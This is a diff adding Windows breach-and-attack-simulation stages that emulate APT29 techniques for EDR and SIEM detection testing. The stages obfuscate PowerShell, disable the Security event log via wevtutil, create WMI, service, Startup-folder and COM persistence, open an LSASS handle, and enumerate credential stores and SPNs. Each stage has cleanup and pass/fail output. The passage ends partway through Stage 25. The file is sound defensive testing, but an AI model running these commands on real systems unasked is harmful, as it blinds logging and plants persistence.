+        Write-Output "FAIL: rundll32.exe proxy execution ran unblocked. EDR should flag rundll32.exe invoked from a scripting-engine parent with no corresponding user-initiated action."
+      } else {
+        Write-Output "PASS: rundll32.exe proxy execution blocked or failed. [BAS-SIM-APT29-S12]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 13 — PowerShell Obfuscation Detection (T1027)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 13 — PowerShell Obfuscation Detection (T1027)"
+    technique_id: T1027
+    detection_profiles: [windows_apt29_defense_evasion]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Builds a benign [BAS-SIM] command string obfuscated with string concatenation and backtick insertion, then runs it via Invoke-Expression, and checks whether ScriptBlock logging (EID 4104) captured the de-obfuscated form. No payload beyond a Write-Output string. APT29 uses string/Base64/backtick obfuscation to defeat signature-based detection. Generates PowerShell EID 4104."
+    reversible: true
+    telemetry:
+      - "PowerShell EID 4104: ScriptBlock logging captures the de-obfuscated command text"
+    detection:
+      - "SIEM: EID 4104 ScriptBlock containing concatenation/backtick obfuscation patterns  -  APT29 loader IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $obfuscated = 'Wr' + [string][char]96 + 'ite-Out' + [string][char]96 + "put" + ' "[BAS-SIM-APT29-S13] obfuscated command simulation, run ' + $runId + '"'
+      $out = Invoke-Expression $obfuscated
+      $ran = ($out -match 'BAS-SIM-APT29-S13')
+      Write-Output "EXEC T1027: obfuscated PowerShell command (string concatenation + backtick) executed via Invoke-Expression, ran=$ran. PowerShell EID 4104 ScriptBlock logging should capture the de-obfuscated text. [BAS-SIM-APT29-S13]"
+      if ($ran) {
+        Write-Output "FAIL: Obfuscated command executed without AMSI/ScriptBlock-logging detection. Ensure EID 4104 is enabled and forwarded, and that AMSI scans the de-obfuscated buffer, not just the literal source."
+      } else {
+        Write-Output "PASS: Obfuscated command blocked or failed to execute. [BAS-SIM-APT29-S13]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 14 — Windows Event Logging Impairment Attempt (T1685.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 14 — Windows Event Logging Impairment Attempt (T1685.001)"
+    technique_id: T1685.001
+    detection_profiles: [windows_apt29_defense_evasion]
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "Attempts to disable the Security event log via wevtutil, then immediately re-enables it and confirms the restored state. Requires local admin; ERRORs with an explicit reason if access is denied rather than reporting PASS/FAIL. APT29 has disabled logging to blind defenders before destructive or collection activity. Generates Security EID 1102 (log cleared) is NOT expected here (this disables, not clears) but a log-configuration-change event is."
+    reversible: true
+    telemetry:
+      - "Security/System log: Security log auditing configuration changed"
+    detection:
+      - "SIEM: Security event logging disabled then re-enabled within seconds  -  P1 alert regardless of BAS context, since legitimate admin changes to this setting are rare and planned"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $before = (& wevtutil.exe gl Security 2>&1 | Out-String)
+        & wevtutil.exe sl Security /e:false 2>&1 | Out-Null
+        $disabled = (& wevtutil.exe gl Security 2>&1 | Out-String) -match 'enabled:\s*false'
+        & wevtutil.exe sl Security /e:true 2>&1 | Out-Null
+        $restored = (& wevtutil.exe gl Security 2>&1 | Out-String) -match 'enabled:\s*true'
+        Write-Output "EXEC T1685.001: Security log disable attempt via wevtutil sl /e:false, disabled=$disabled, then restored=$restored. [BAS-SIM-APT29-S14]"
+        if ($disabled) {
+          Write-Output "FAIL: Security event log was disabled without being blocked. This should be a P1 SIEM alert independent of BAS context."
+        } else {
+          Write-Output "PASS: Security event log disable attempt was blocked or had no effect. [BAS-SIM-APT29-S14]"
+        }
+      } catch {
+        Write-Output "ERROR: Windows event logging impairment attempt could not be evaluated  -  $($_.Exception.Message). Likely cause: insufficient privilege (requires local admin). Not scored as PASS or FAIL. [BAS-SIM-APT29-S14]"
+      }
+    cleanup: |
+      & wevtutil.exe sl Security /e:true 2>&1 | Out-Null
+
+  # ---------------------------------------------------------------------------
+  # PHASE 7 — PERSISTENCE CLUSTER (stages 15-18)
+  # ---------------------------------------------------------------------------
+
+  # ---------------------------------------------------------------------------
+  # Stage 15 — Startup Folder Persistence Write + Delete (T1547.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 15 — Startup Folder Persistence Write + Delete (T1547.001)"
+    technique_id: T1547.001
+    detection_profiles: [windows_apt29_persistence]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes a benign .cmd file into the current user's Startup folder containing only an echo of a [BAS-SIM] string, confirms it exists, then deletes it. Distinct mechanism from Stage 3's HKCU Run-key write (same technique_id T1547.001, different sub-mechanism), both kept since APT29 has used both. Generates Sysmon EID 11 (file create) + EID 23 (file delete)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11: file create in \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+      - "Sysmon EID 23: file delete in the same path"
+    detection:
+      - "EDR: new file written to the Startup folder  -  Sigma rule file_event_win_startup_folder_persistence.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $startupDir = [Environment]::GetFolderPath('Startup')
+      $filePath = Join-Path $startupDir 'BAS-Sim-APT29.cmd'
+      Set-Content -Path $filePath -Value '@echo [BAS-SIM-APT29-S15] startup folder persistence simulation' -Force
+      $written = Test-Path $filePath
+      Remove-Item $filePath -Force -ErrorAction SilentlyContinue
+      $deleted = -not (Test-Path $filePath)
+      if ($written) {
+        Write-Output "EXEC T1547.001: Startup-folder file '$filePath' written then deleted=$deleted. Distinct mechanism from Stage 3's Run-key write. Sysmon EID 11+23 expected. [BAS-SIM-APT29-S15]"
+        Write-Output "FAIL: Startup-folder persistence write ran without EDR block. Ensure Sysmon EID 11 is ingested and a rule covers new files in the Startup folder."
+      } else {
+        Write-Output "PASS: Startup-folder write blocked  -  policy or EDR prevented the write. [BAS-SIM-APT29-S15]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path ([Environment]::GetFolderPath('Startup')) 'BAS-Sim-APT29.cmd') -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 16 — WMI Event Subscription Persistence (T1546.003)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 16 — WMI Event Subscription Persistence (T1546.003)"
+    technique_id: T1546.003
+    detection_profiles: [windows_apt29_persistence]
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "Creates a real __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding triple whose consumer action is a benign [BAS-SIM] echo, confirms all three objects exist, then removes all three. Requires local admin; ERRORs with an explicit reason if WMI object creation is denied. APT29/TEARDROP-adjacent actors use WMI event subscriptions for fileless, reboot-persistent execution. Generates Sysmon EID 19/20/21."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 19: __EventFilter instance created (BAS-Sim-APT29-Filter)"
+      - "Sysmon EID 20: __FilterToConsumerBinding instance created"
+      - "Sysmon EID 21: CommandLineEventConsumer instance created (BAS-Sim-APT29-Consumer)"
+    detection:
+      - "EDR: WMI persistence triple created  -  Sigma rule wmi_event_subscription_persistence.yml"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $filterName = 'BAS-Sim-APT29-Filter'
+        $consumerName = 'BAS-Sim-APT29-Consumer'
+        $filter = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments @{ Name = $filterName; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0" }
+        $consumer = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments @{ Name = $consumerName; CommandLineTemplate = 'cmd.exe /c echo [BAS-SIM-APT29-S16]' }
+        $binding = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments @{ Filter = $filter; Consumer = $consumer }
+        $created = ($null -ne $filter -and $null -ne $consumer -and $null -ne $binding)
+        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
+        Remove-WmiObject -InputObject $consumer -ErrorAction SilentlyContinue
+        Remove-WmiObject -InputObject $filter -ErrorAction SilentlyContinue
+        $remaining = Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
+        $removed = ($null -eq $remaining)
+        Write-Output "EXEC T1546.003: WMI event-subscription triple created=$created then removed=$removed. Sysmon EID 19/20/21 expected. [BAS-SIM-APT29-S16]"
+        if ($created) {
+          Write-Output "FAIL: WMI persistence objects created without EDR block. Ensure Sysmon EID 19-21 are ingested and alert on new root\subscription objects."
+        } else {
+          Write-Output "PASS: WMI persistence object creation blocked. [BAS-SIM-APT29-S16]"
+        }
+      } catch {
+        Write-Output "ERROR: WMI event subscription persistence could not be evaluated  -  $($_.Exception.Message). Likely cause: insufficient privilege (requires local admin). Not scored as PASS or FAIL. [BAS-SIM-APT29-S16]"
+      }
+    cleanup: |
+      Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match 'BAS-Sim-APT29-Filter' } | Remove-WmiObject -ErrorAction SilentlyContinue
+      Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Filter "Name='BAS-Sim-APT29-Consumer'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
+      Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -Filter "Name='BAS-Sim-APT29-Filter'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 17 — Windows Service Persistence (T1543.003)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 17 — Windows Service Persistence (T1543.003)"
+    technique_id: T1543.003
+    detection_profiles: [windows_apt29_persistence]
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "Creates a Manual-start (never started) Windows service running a benign cmd.exe echo, confirms it exists, then deletes it via sc.exe delete. Requires local admin; ERRORs with an explicit reason if denied. APT29 has used service creation for persistence that survives reboots. Generates Security EID 4697 (service installed) and System EID 7045."
+    reversible: true
+    telemetry:
+      - "Security EID 4697: a service was installed (ZZ-BAS-APT29-Svc)"
+      - "System EID 7045: a service was installed in the system"
+    detection:
+      - "EDR: new service created with a non-standard binary path  -  Sigma rule service_installation_win_susp.yml"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $svcName = 'ZZ-BAS-APT29-Svc'
+        New-Service -Name $svcName -BinaryPathName 'cmd.exe /c echo [BAS-SIM-APT29-S17]' -StartupType Manual -ErrorAction Stop | Out-Null
+        $exists = [bool](Get-Service -Name $svcName -ErrorAction SilentlyContinue)
+        & sc.exe delete $svcName 2>&1 | Out-Null
+        Start-Sleep -Milliseconds 500
+        $removed = -not [bool](Get-Service -Name $svcName -ErrorAction SilentlyContinue)
+        Write-Output "EXEC T1543.003: Manual-start service '$svcName' created=$exists (never started) then removed=$removed via sc.exe delete. Security EID 4697 expected. [BAS-SIM-APT29-S17]"
+        if ($exists) {
+          Write-Output "FAIL: Service persistence creation ran without EDR block. Ensure Security EID 4697 forwards to SIEM and flags services with suspicious binary paths."
+        } else {
+          Write-Output "PASS: Service creation blocked. [BAS-SIM-APT29-S17]"
+        }
+      } catch {
+        Write-Output "ERROR: Windows service persistence could not be evaluated  -  $($_.Exception.Message). Likely cause: insufficient privilege (requires local admin). Not scored as PASS or FAIL. [BAS-SIM-APT29-S17]"
+      }
+    cleanup: |
+      & sc.exe delete 'ZZ-BAS-APT29-Svc' 2>&1 | Out-Null
+
+  # ---------------------------------------------------------------------------
+  # Stage 18 — COM Hijacking Detection Simulation (T1546.015)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 18 — COM Hijacking Detection Simulation (T1546.015)"
+    technique_id: T1546.015
+    detection_profiles: [windows_apt29_persistence]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes a benign string value under a disposable, non-existent CLSID path in HKCU\\Software\\Classes\\CLSID (never a well-known/in-use CLSID, so nothing is actually hijacked or loaded), confirms the write, then deletes the key. APT29 has used CLSID InprocServer32 overrides in HKCU for persistence that doesn't require admin. Generates Sysmon EID 13 (registry set) + EID 14 (delete)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 13: registry value set under HKCU\\Software\\Classes\\CLSID\\{<disposable GUID>}\\InprocServer32"
+      - "Sysmon EID 14: registry key deleted"
+    detection:
+      - "EDR: new CLSID InprocServer32 value under HKCU  -  Sigma rule registry_set_com_hijack_persistence.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $clsid = '{BA5-01D-00000000-0000-APT29-S18BAS}'
+      $keyPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+      New-Item -Path $keyPath -Force | Out-Null
+      Set-ItemProperty -Path $keyPath -Name '(default)' -Value 'C:\Windows\System32\bas-sim-apt29-s18.dll' -ErrorAction SilentlyContinue
+      $written = (Get-ItemProperty -Path $keyPath -ErrorAction SilentlyContinue).'(default)' -eq 'C:\Windows\System32\bas-sim-apt29-s18.dll'
+      Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force -ErrorAction SilentlyContinue
+      $deleted = -not (Test-Path $keyPath)
+      if ($written) {
+        Write-Output "EXEC T1546.015: disposable CLSID InprocServer32 value written then deleted=$deleted (never a real/in-use CLSID). Sysmon EID 13+14 expected. [BAS-SIM-APT29-S18]"
+        Write-Output "FAIL: COM hijack-pattern registry write ran without EDR block. Ensure Sysmon EID 13 is ingested and a rule covers new CLSID InprocServer32 values under HKCU."
+      } else {
+        Write-Output "PASS: CLSID registry write blocked. [BAS-SIM-APT29-S18]"
+      }
+    cleanup: |
+      Remove-Item -Path 'HKCU:\Software\Classes\CLSID\{BA5-01D-00000000-0000-APT29-S18BAS}' -Recurse -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # PHASE 7 — CREDENTIAL-ACCESS CLUSTER (stages 19-23)
+  # Approved tier only: real OS/API calls that attempt access or enumerate names,
+  # never a call that can return secret material, process memory, or a ticket.
+  # ---------------------------------------------------------------------------
+
+  # ---------------------------------------------------------------------------
+  # Stage 19 — LSASS Access Attempt (T1003.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 19 — LSASS Access Attempt (T1003.001)"
+    technique_id: T1003.001
+    detection_profiles: [windows_credential_access]
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "Opens a QUERY-ONLY handle to lsass.exe (PROCESS_QUERY_LIMITED_INFORMATION, via .NET Process.Handle on a process opened with that access right) and immediately closes it. Never requests PROCESS_VM_READ, never calls any memory-dump API (MiniDumpWriteDump etc.), never reads a single byte of LSASS memory. This is a real access attempt, not a credential-dumping tool. Whether Sysmon EID 10 (ProcessAccess) fires depends on the endpoint's process-access auditing configuration and the granted access mask  -  do not assume it fires without checking the real lab endpoint (see the Phase 7 lab-validation runbook)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 10 (ProcessAccess) IF the endpoint's Sysmon config captures query-only GrantedAccess masks against lsass.exe  -  verify on the real lab endpoint, do not assume"
+    detection:
+      - "EDR: any handle opened to lsass.exe from a non-system process  -  Sigma rule proc_access_win_lsass_handle.yml"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $lsass = Get-Process -Name lsass -ErrorAction Stop
+        $handleOpened = $false
+        $probeRan = $false
+        try {
+          # Query-only: PROCESS_QUERY_LIMITED_INFORMATION (0x1000). Never VM_READ (0x0010).
+          $sig = '[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid); [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);'
+          $Error.Clear()
+          Add-Type -MemberDefinition $sig -Name BasLsassQuery -Namespace Bas -ErrorAction SilentlyContinue
+          $launchErr = if ($Error.Count -gt 0) { [string]$Error[0] } else { '' }
+          $h = [Bas.BasLsassQuery]::OpenProcess(0x1000, $false, $lsass.Id)
+          $handleOpened = ($h -ne [IntPtr]::Zero)
+          $probeRan = $true
+          if ($handleOpened) { [Bas.BasLsassQuery]::CloseHandle($h) | Out-Null }
+        } catch {
+          $handleOpened = $false
+        }
+        Write-Output "EXEC T1003.001: LSASS access attempt, query-only handle (PROCESS_QUERY_LIMITED_INFORMATION) opened=$handleOpened, closed immediately. No memory was read. Sysmon EID 10 may or may not fire depending on process-access audit config  -  verify on the real endpoint. [BAS-SIM-APT29-S19]"
+        if ($handleOpened) {
+          Write-Output "FAIL: A handle to lsass.exe was opened without being blocked. Confirm whether Sysmon EID 10 captured this GrantedAccess mask; if not, process-access auditing granularity needs review (this is expected to need manual confirmation, not an assumed detection)."
+        } elseif (-not $probeRan) {
+          if ($launchErr -match 'blocked by|AppLocker|Constrained Language|AMSI|Defender|group policy|administrator has blocked|virus|malicious') { Write-Output "PASS: the LSASS probe was refused by a control before the handle was requested. [BAS-SIM-APT29-S19]" } else { Write-Output "ERROR: the LSASS probe could not run and no control block was named. Not scored as PASS or FAIL. [BAS-SIM-APT29-S19]" }
+        } else {
+          Write-Output "PASS: LSASS handle open was denied by the OS. [BAS-SIM-APT29-S19]"
+        }
+      } catch {
+        Write-Output "ERROR: LSASS access attempt could not be evaluated  -  $($_.Exception.Message). Likely cause: insufficient privilege (requires local admin) or lsass.exe not found. Not scored as PASS or FAIL. [BAS-SIM-APT29-S19]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 20 — Windows Credential Manager Access Attempt (T1555.004)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 20 — Windows Credential Manager Access Attempt (T1555.004)"
+    technique_id: T1555.004
+    detection_profiles: [windows_credential_access]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Enumerates stored credential TARGET NAMES only via cmdkey /list (the enumeration call, never CredRead against a specific target). The secret blob is never requested or printed  -  only target/user-name strings that cmdkey itself prints as metadata. Whether this generates distinct EDR telemetry beyond standard process creation depends on the endpoint's config  -  verify, don't assume."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: cmdkey.exe /list"
+    detection:
+      - "EDR: cmdkey.exe /list invoked from PowerShell  -  Sigma rule proc_creation_win_cmdkey_list.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $out = & cmdkey.exe /list 2>&1 | Out-String
+      $found = $out -match 'Target:'
+      Write-Output "EXEC T1555.004: Credential Manager enumeration via cmdkey /list ran. target_names_found=$found. Only target/user-name metadata was read  -  no secret blob was requested (CredRead was never called). Sysmon EID 1 (cmdkey.exe) expected. [BAS-SIM-APT29-S20]"
+      if ($found) {
+        Write-Output "FAIL: Credential Manager enumeration ran unimpeded. EDR should flag cmdkey.exe /list from a non-admin PowerShell session."
+      } else {
+        Write-Output "PASS: Credential Manager enumeration blocked or returned nothing. [BAS-SIM-APT29-S20]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 21 — Browser Credential Store Access Attempt (T1555.003)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 21 — Browser Credential Store Access Attempt (T1555.003)"
+    technique_id: T1555.003
+    detection_profiles: [windows_credential_access]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Checks for the EXISTENCE and file METADATA (path, size, last-write time) of the Chrome/Edge 'Login Data' SQLite file and the Firefox logins.json/key4.db files under the current user's profile. Never opens or queries the SQLite database, never calls CryptUnprotectData against any blob found there  -  that combination would be DPAPI-unprotecting a real stored credential, explicitly excluded from this tier."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1 or file-access telemetry for Test-Path/Get-Item against the browser profile directory (low-fidelity on its own)"
+    detection:
+      - "EDR: access to a browser 'Login Data'/logins.json path from a non-browser process  -  Sigma rule file_access_win_browser_credential_store.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $chromeLoginData = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Login Data'
+      $edgeLoginData = Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data\Default\Login Data'
+      $ffLogins = Get-ChildItem -Path (Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles') -Filter 'logins.json' -Recurse -ErrorAction SilentlyContinue
+      $found = @()
+      foreach ($p in @($chromeLoginData, $edgeLoginData)) { if (Test-Path $p) { $found += (Get-Item $p).FullName } }
+      if ($ffLogins) { $found += $ffLogins.FullName }
+      Write-Output "EXEC T1555.003: browser credential-store metadata check (existence/path/size/last-write only  -  no database opened, no CryptUnprotectData called). stores_found=$($found.Count). [BAS-SIM-APT29-S21]"
+      if ($found.Count -gt 0) {
+        Write-Output "FAIL: Browser credential-store files were located without EDR block. Flag access to Login Data/logins.json paths from a non-browser process."
+      } else {
+        Write-Output "PASS: No browser credential-store file was found or access was blocked. [BAS-SIM-APT29-S21]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 22 — Kerberos Service Account Enumeration (T1558.003)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 22 — Kerberos Service Account Enumeration (T1558.003)"
+    technique_id: T1558.003
+    detection_profiles: [windows_credential_access]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Lists accounts carrying a ServicePrincipalName via setspn /Q */* (read-only). Never calls Add-Type System.IdentityModel / KerberosRequestorSecurityToken or any API that requests a service ticket  -  no ticket is ever requested or extracted, matching the approved tier exactly. APT29 enumerates SPN-bearing accounts before a selective Kerberoasting attempt against a real target."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: setspn.exe -Q */*"
+    detection:
+      - "EDR: setspn.exe invoked from PowerShell  -  Sigma rule proc_creation_win_setspn_enum.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $Error.Clear()
+      $out = & setspn.exe -Q */* 2>&1 | Out-String
+      $launchErr = if ($Error.Count -gt 0) { [string]$Error[0] } else { '' }
+      $found = $out -match 'CN='
+      Write-Output "EXEC T1558.003: Kerberos SPN enumeration via setspn -Q */* ran. spn_accounts_found=$found. No service ticket was requested or extracted. Sysmon EID 1 (setspn.exe) expected. [BAS-SIM-APT29-S22]"
+      if ($found) {
+        Write-Output "FAIL: SPN enumeration ran unimpeded. EDR/SIEM should alert on setspn.exe -Q */* from a non-admin workstation (classic Kerberoasting precursor)."
+      } elseif ([string]::IsNullOrWhiteSpace($out)) {
+        if ($launchErr -match 'blocked by|AppLocker|Constrained Language|AMSI|Defender|group policy|administrator has blocked|virus|malicious') { Write-Output "PASS: setspn was refused by a control. [BAS-SIM-APT29-S22]" } else { Write-Output "ERROR: setspn produced no output and no control block was named, so SPN enumeration did not run. [BAS-SIM-APT29-S22]" }
+      } elseif ($out -match 'Checking domain') {
+        Write-Output "PASS: SPN enumeration ran and returned no SPN accounts. [BAS-SIM-APT29-S22]"
+      } else {
+        Write-Output "ERROR: setspn output was not a recognised enumeration result, so SPN enumeration is not scored. [BAS-SIM-APT29-S22]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 23 — DPAPI Credential Access Simulation (T1555)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 23 — DPAPI Credential Access Simulation (T1555)"
+    technique_id: T1555
+    detection_profiles: [windows_credential_access]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Generates a SYNTHETIC byte array (never derived from any real credential), protects it via ProtectedData.Protect (DataProtectionScope.CurrentUser, a disposable in-memory operation using the user's own DPAPI master key, not an exported/stolen key), then unprotects it and confirms round-trip equality, discarding both buffers. Never calls Unprotect against any file found on disk  -  that would be DPAPI-unprotecting a real stored secret, explicitly excluded. Demonstrates real DPAPI protect/unprotect API usage without touching real secret material."
+    reversible: true
+    telemetry:
+      - "Low-fidelity alone: a .NET process calling CryptUnprotectData/CryptProtectData via ProtectedData  -  correlate with other credential-access-cluster stages, not scored on its own"
+    detection:
+      - "EDR: ProtectedData.Unprotect called from a scripting-engine process outside normal application behavior  -  Sigma rule proc_creation_win_dpapi_unprotect_script.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      Add-Type -AssemblyName System.Security
+      $synthetic = [System.Text.Encoding]::UTF8.GetBytes('[BAS-SIM-APT29-S23] synthetic DPAPI round-trip test data -- not a real credential')
+      $protected = [System.Security.Cryptography.ProtectedData]::Protect($synthetic, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+      $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect($protected, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+      $roundTrip = [System.Text.Encoding]::UTF8.GetString($unprotected) -eq [System.Text.Encoding]::UTF8.GetString($synthetic)
+      Write-Output "EXEC T1555: DPAPI protect/unprotect round-trip on synthetic test data succeeded=$roundTrip. No real stored secret or file on disk was unprotected. [BAS-SIM-APT29-S23]"
+      if ($roundTrip) { Write-Output "FAIL: DPAPI protect/unprotect ran unimpeded (expected  -  this is the user's own legitimate DPAPI operation on synthetic data; a real-world finding here would be a stolen DPAPI master-key blob being unprotected elsewhere, not this call itself)." } else { Write-Output "ERROR: DPAPI round trip did not complete on synthetic data, so the stage did not run." }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # PHASE 7 — LATERAL-MOVEMENT CLUSTER (stages 24-26)
+  # All three SKIP with an explicit reason when $env:BAS_APT29_TARGET_HOST is
+  # unset -- never silently pass without a configured second host.
+  # ---------------------------------------------------------------------------
+
+  # ---------------------------------------------------------------------------
+  # Stage 24 — SMB Administrative Share Access (T1021.002)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 24 — SMB Administrative Share Access (T1021.002)"
+    technique_id: T1021.002
+    detection_profiles: [windows_apt29_lateral_movement]
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "SKIPs with an explicit reason when $env:BAS_APT29_TARGET_HOST is unset -- never silently passes. When set: checks existence of \\\\<target>\\C$ via Test-Path only; never copies a file to or from the share. APT29 uses admin shares for lateral file staging. Generates Security EID 5140/5145 on the target."
+    reversible: true
+    telemetry:
+      - "Security EID 5140 (network share accessed) / 5145 (detailed file share access) on the target host, for \\\\<target>\\C$"
+    detection:
+      - "EDR/SIEM: C$ admin-share access from a workstation account  -  Sigma rule net_share_access_win_admin_share.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_APT29_TARGET_HOST
+      if ([string]::IsNullOrWhiteSpace($target)) {
+        Write-Output "SKIP: APT29 Stage 24 (SMB Administrative Share Access) not run  -  no remote target host configured (`$env:BAS_APT29_TARGET_HOST unset). This step requires a second reachable host; configure the env var to run it. [BAS-SIM-APT29-S24]"
+      } else {
+        $accessible = Test-Path "\\$target\C$"
+        $reach445 = Test-NetConnection -ComputerName $target -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue
+        Write-Output "EXEC T1021.002: SMB admin-share existence check against \\$target\C$ ran. accessible=$accessible. No file was copied. Security EID 5140/5145 expected on the target. [BAS-SIM-APT29-S24]"
+        if ($accessible) {
+          Write-Output "FAIL: Admin-share access succeeded unimpeded. SIEM should alert on C$ access from a workstation account outside normal admin activity."
+        } elseif ($reach445) {
+          Write-Output "PASS: admin-share access was denied while SMB 445 is reachable. Access control is the likely cause; a misconfiguration would look the same, so this is not independently proven. [BAS-SIM-APT29-S24]"
+        } else {
+          Write-Output "ERROR: target $target is not reachable on SMB 445, so the admin-share check did not run. [BAS-SIM-APT29-S24]"
+        }
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 25 — WinRM Remote Execution Simulation (T1021.006)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 25 — WinRM Remote Execution Simulation (T1021.006)"
+    technique_id: T1021.006
+    detection_profiles: [windows_apt29_lateral_movement]
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
